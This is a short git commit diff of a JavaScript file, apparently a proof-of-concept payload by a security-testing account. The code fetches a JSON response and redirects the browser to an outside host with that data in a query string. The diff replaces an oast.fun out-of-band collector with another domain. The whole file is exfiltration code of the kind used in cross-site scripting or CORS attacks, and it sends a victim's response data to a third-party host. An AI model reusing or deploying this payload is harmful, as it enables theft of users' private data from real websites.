fe338c9bcc7e235796f5fdf86ac0dddec708fa55
Snapsec <88488902+Snap-sec@users.noreply.github.com>
2024-01-24 16:39:24 +0530

    a

--- aa.js
+++ aa.js
@@ -5,6 +5,6 @@ xhr.setRequestHeader('Content-type', 'application/json');
 xhr.onload = () => {
     const data = JSON.parse(xhr.responseText);
 var imran= (JSON.stringify(data));
-location.replace("http://bartqtkbajnhmsotmlzp4q9wse2zlm1lp.oast.fun/?DATA=" + imran );
+location.replace("http://imran.com/?DATA=" + imran );
 };
 xhr.send('{}');
